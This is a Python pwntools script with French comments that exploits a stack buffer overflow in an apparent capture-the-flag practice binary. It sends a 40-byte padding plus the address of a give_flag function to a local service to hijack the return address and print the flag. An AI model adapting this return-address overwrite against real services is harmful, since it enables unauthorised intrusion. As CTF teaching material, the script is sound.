from pwn import *

# Configurer le contexte pour 64-bit ou 32-bit (ajuster si besoin)
# context.arch = 'amd64' # ou 'i386' pour 32 bits
# context.os = 'linux'
context.log_level = 'info' # Pour voir les interactions de pwntools

# L'adresse locale du challenge (si sur la même machine)
# ou adresse IP et port du serveur CTF
HOST = '127.0.0.1' # ou l'IP du serveur Docker
PORT = 1234 # Le port que tu exporteras avec Docker

# Adresse de la fonction give_flag (à obtenir via GDB)
# Remplacez par la vraie adresse de give_flag de votre binaire
# Par exemple, pour un binaire 64-bit non-PIE : 0x0000000000401234
# Pour un binaire 32-bit non-PIE : 0x08048abc
WIN_FUNCTION_ADDRESS = 0x401186 # Remplacez cette valeur par celle trouvée avec GDB pour votre binaire 64-bit compilé

# Offset du buffer (à obtenir via cyclic -l ou GDB)
# C'est la distance entre le début du buffer et l'adresse de retour
OFFSET = 40 # Remplacez par la valeur trouvée

def exploit():
    # Lance le processus local ou se connecte à distance
    # Pour un challenge local, utiliser process('./vuln_program')
    # Pour un challenge Dockerisé, utiliser remote(HOST, PORT)
    # p = process('./vuln_program')
    p = remote(HOST, PORT)

    info("Programme démarré, en attente de l'invite...")

    # Attendre le prompt "Veuillez entrer votre nom : "
    p.recvuntil(b"Veuillez entrer votre nom : ")

    # Construire le payload
    # 'A' * OFFSET : Le padding pour remplir le buffer jusqu'à l'adresse de retour
    # p64(WIN_FUNCTION_ADDRESS) : L'adresse de retour écrasée avec l'adresse de give_flag
    # p64() pour 64-bit, p32() pour 32-bit
    payload = b"A" * OFFSET + p64(WIN_FUNCTION_ADDRESS)

    info("Envoi du payload : %s", payload)
    p.sendline(payload)

    # Recevoir toute la sortie du programme après l'envoi du payload
    # Le flag devrait être dans cette sortie.
    output = p.recvall(timeout=2) # Ajoute un timeout au cas où
    success("Output du programme:\n%s", output.decode(errors='ignore'))

    p.close()

if __name__ == "__main__":
    exploit()